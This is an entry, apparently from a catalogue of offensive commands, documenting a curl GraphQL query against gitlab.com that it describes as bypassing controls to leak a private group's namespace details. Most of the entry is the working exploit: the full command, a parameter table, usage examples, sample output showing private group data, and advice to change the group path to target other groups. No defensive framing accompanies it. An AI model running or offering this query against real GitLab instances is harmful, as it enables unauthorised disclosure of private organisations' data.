---
data: >-
  curl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json'
  --data '{"query":"{namespace(fullPath:\"secret-group-213\") {description\n
  requestAccessEnabled\n fullName\n fullPath\n id\n lfsEnabled\n name\n path\n
  visibility\n projects (includeSubgroups: true, ) {edges {node {id\n name\n
  archived\n visibility\n
  description}}}}}","variables":null,"operationName":null}'
tags:
  - graphql
  - exploit
  - query
type: command
output: >-
  {"data":{"namespace":{"description":"This description is
  secret!","requestAccessEnabled":false,"fullName":"secret
  group","fullPath":"secret-group-213","id":"gid://gitlab/Group/5337756","lfsEnabled":true,"name":"secret
  group","path":"secret-group-213","visibility":"private","projects":{"edges":[]}}}}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:59.858Z'
id: 70c866c1-0ff2-4d5a-9401-1043f2320b2c
verified: false
validated: true
submitted: true
---
# curl-graphql-group-namespace-query

## Command

```bash
curl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json' --data '{"query":"{namespace(fullPath:\"secret-group-213\") {description\n requestAccessEnabled\n fullName\n fullPath\n id\n lfsEnabled\n name\n path\n visibility\n projects (includeSubgroups: true, ) {edges {node {id\n name\n archived\n visibility\n description}}}}}","variables":null,"operationName":null}'
```

## Description

Executes GraphQL query to bypass controls and leak private group namespace in GitLab.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `'https://gitlab.com/api/graphql'` | Endpoint for GraphQL | Yes |
| `-H 'Content-Type: application/json'` | JSON header | Yes |
| `--data '{"query":...}'` | Query with group fullPath and fields | Yes |
| `"variables":null` | Unused variables | No |
| `"operationName":null` | No operation name | No |

## Examples

### Basic Usage

```bash
curl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json' --data '{"query":"{namespace(fullPath:\"secret-group-213\") {...}}","variables":null,"operationName":null}'
```

### Advanced Usage

Change fullPath for other groups; include subgroups in projects.

## Expected Output

JSON data with private group info, including description and empty projects edges.

## Related

- [[Related Procedure]]
